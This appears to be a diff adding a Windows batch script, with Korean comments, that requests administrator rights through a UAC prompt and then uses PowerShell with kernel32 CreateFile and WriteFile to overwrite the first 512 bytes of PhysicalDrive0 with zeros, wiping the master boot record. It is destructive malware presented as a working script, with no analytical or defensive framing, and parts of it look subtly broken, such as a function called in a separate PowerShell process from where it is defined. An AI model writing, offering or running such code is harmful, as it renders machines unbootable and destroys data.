@@ -1,0 +1,57 @@
+@echo off
+:: 관리자 권한으로 실행하기 위한 UAC (User Account Control) 코드
+set "ELEVATE_CMD=^
+    PowerShell -Command^
+    ""Start-Process '%~0' -Verb RunAs""
+"
+
+:: UAC 확인 및 관리자 권한으로 다시 실행
+>nul 2>&1 "%SYSTEMROOT%\system32\icacls.exe" "%SYSTEMROOT%" | findstr /c:"Successfully" && goto :run
+powershell -command "%ELEVATE_CMD%" & exit /b
+
+:run
+set GenericRead=0x80000000
+set GenericWrite=0x40000000
+set GenericExecute=0x20000000
+set GenericAll=0x10000000
+
+set FileShareRead=0x1
+set FileShareWrite=0x2
+
+set OpenExisting=0x3
+
+set MbrSize=512
+
+set Signature=^
+@"^
+[DllImport("kernel32")]^
+public static extern IntPtr CreateFile(^
+    string lpFileName,^
+    uint dwDesiredAccess,^
+    uint dwShareMode,^
+    IntPtr lpSecurityAttributes,^
+    uint dwCreationDisposition,^
+    uint dwFlagsAndAttributes,^
+    IntPtr hTemplateFile);^
+^
+[DllImport("kernel32")]^
+public static extern bool WriteFile(^
+    IntPtr hFile,^
+    byte[] lpBuffer,^
+    uint nNumberOfBytesToWrite,^
+    out uint lpNumberOfBytesWritten,^
+    IntPtr lpOverlapped);^
+"@
+
+powershell -Command "Add-Type -MemberDefinition '%Signature%' -Namespace better -Name MBR"
+
+powershell -Command "function mbr_start {^
+    $mbrData = New-Object byte[] %MbrSize%^
+    $mbr = [better.MBR]::CreateFile('\\.\PhysicalDrive0', %GenericAll%, ($FileShareRead -bor $FileShareWrite),^
+        [IntPtr]::Zero, %OpenExisting%, 0, [IntPtr]::Zero)^
+    $bytesWritten = 0^
+    [better.MBR]::WriteFile($mbr, $mbrData, %MbrSize%, [ref]$bytesWritten, [IntPtr]::Zero)^
+}"
+
+REM mbr_start 메서드 실행
+powershell -Command "mbr_start"
